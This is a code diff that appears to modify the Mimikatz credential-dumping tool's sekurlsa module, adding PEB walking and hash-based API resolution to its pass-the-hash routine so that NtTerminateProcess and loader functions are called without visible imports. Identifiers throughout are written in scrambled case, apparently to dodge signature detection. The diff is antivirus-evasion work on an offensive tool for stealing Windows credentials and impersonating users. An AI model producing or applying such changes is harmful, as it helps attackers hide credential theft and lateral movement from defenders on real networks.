@@ -4,6 +4,7 @@
 	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
 */
 #include "kuhl_m_seKuRlSa.h"
+#include "..\mimilib\api_resolver.h"
 
 const KUHL_M_C kuhl_m_c_seKuRlSa[] = {
 	{kuhl_m_seKuRlSa_mSv,				L"mSv",				L"Lists LM & NTLM crEdentials"},
@@ -891,6 +892,19 @@ NTSTATUS kuhl_m_seKuRlSa_ptH(int argc, wchar_t * argv[])
 	PROCESS_INFORMATION ProCeSsInfos;
 	BOOL isImpersonate;
 
+	HMODULE hKernel32Base = GetModuleBaseFromPEB(L"kernel32.dll");
+	customGetModuleHandleW fGetModuleHandleW = (customGetModuleHandleW)getFunctionByHash(hKernel32Base, H_GetModuleHandleW);
+
+
+	HMODULE hTermProc = fGetModuleHandleW(L"ntdll.dll");
+
+	customLoadLibraryW fLoadLibraryW = (customLoadLibraryW)getFunctionByHash(hKernel32Base, H_LoadLibraryW);
+
+	if (!hTermProc) hTermProc = fLoadLibraryW(L"ntdll.dll");
+
+	pNtTerminateProcess fNtTerminateProcess = (pNtTerminateProcess)getFunctionByHash(hTermProc, H_TERMINATIONPROCESS);
+	customGetModuleHandleW fTerminationProc = (customGetModuleHandleW)getFunctionByHash(hTermProc, H_TERMINATIONPROCESS);
+
 	if(kull_m_string_args_byName(argc, argv, L"luid", &szLuid, NULL))
 	{
 		tOKEnStats.AuthenticationId.HighPart = 0; // because I never saw it != 0
@@ -982,11 +996,13 @@ NTSTATUS kuhl_m_seKuRlSa_ptH(int argc, wchar_t * argv[])
 									CloseHandle(hNewToken);
 								}
 								else PRINT_ERROR_AUTO(L"DuplicateTokenEx");
-								NtTerminateProcess(ProCeSsInfos.hProcess, STATUS_SUCCESS);
+								//NtTerminateProcess(ProCeSsInfos.hProcess, STATUS_SUCCESS);
+								fNtTerminateProcess(ProCeSsInfos.hProcess, STATUS_SUCCESS);
 							}
 							else NtResumeProcess(ProCeSsInfos.hProcess);
 						}
-						else NtTerminateProcess(ProCeSsInfos.hProcess, STATUS_PROCESS_IS_TERMINATING);
+						//else NtTerminateProcess(ProCeSsInfos.hProcess, STATUS_PROCESS_IS_TERMINATING);
+						else fNtTerminateProcess(ProCeSsInfos.hProcess, STATUS_PROCESS_IS_TERMINATING);
 					}
 					else PRINT_ERROR_AUTO(L"GetTokenInformation");
 					CloseHandle(hToken);
